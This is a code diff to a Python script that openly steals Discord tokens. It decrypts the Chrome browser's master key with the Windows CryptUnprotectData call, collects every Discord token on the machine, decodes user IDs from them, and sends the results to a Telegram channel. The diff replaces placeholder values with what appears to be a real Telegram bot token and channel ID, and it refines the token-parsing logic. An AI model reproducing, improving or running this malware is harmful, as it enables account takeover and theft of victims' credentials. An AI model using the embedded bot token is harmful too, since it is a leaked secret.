@@ -7,10 +7,8 @@ import json
 import requests
 import subprocess
 
-
-
-BOT_TOKEN = 'YOUR TELEGRAM BOT TOKEN'
-CHANNEL_ID = TTELEGRAM CHANNEL ID WHERE THE BOT IS LOCATED
+BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
+CHANNEL_ID = -1002015035900
 
 
 def send_download_link(download_link):
@@ -58,9 +56,11 @@ def get_masterKey():
     with open(path, 'r') as f:
         data = f.read()
         data = json.loads(data)
-        key = data['os_crypt']['encrypted_key']  # this is the master key, but it's encrypted with win32crypt windows function
+        key = data['os_crypt'][
+            'encrypted_key']  # this is the master key, but it's encrypted with win32crypt windows function
         decoded_key = base64.b64decode(key)[5:]
-        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]  # we decrypted the master key, and it's ready to use
+        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[
+            1]  # we decrypted the master key, and it's ready to use
 
 
 class Discord:
@@ -71,7 +71,6 @@ class Discord:
         """
         Grab All Discord Tokens Found on This Machine.
         """
-
 
     def get_tokens(self):
         """
@@ -111,7 +110,7 @@ class Discord:
 if __name__ == '__main__':
     discord = Discord()
     decrypted_tokens = discord.get_tokens()
-    not_allowed_chars = ['', '`', '', '|', '', '', "'", '%', '"', '!']
+    not_allowed_chars = ['', '`', '', '|', '', '', "'", '%', '"', '!', ']', '[', '(', ')']
     for token in decrypted_tokens:
         for char in not_allowed_chars:
             if char in token:
@@ -122,11 +121,11 @@ if __name__ == '__main__':
         if uid.startswith('NT'):
             dec_uid = base64.b64decode(uid).decode('utf-8')
         elif uid.startswith('MT'):
-                uid = uid + '.' + uid_list[1][:2]
-                dec_uid = base64.b64decode(uid).decode('utf-8')
+            uid = uid + '.' + uid_list[1][:2]
+            dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')
         elif uid.startswith('OD') or uid.startswith('O'):
             uid = uid + '.' + uid_list[1][:4]
-            dec_uid = base64.b64decode(uid).decode('utf-8')
+            dec_uid = base64.b64decode(uid)[:-3].decode('utf-8')
         else:
             try:
                 dec_uid = base64.b64decode(uid).decode('utf-8')
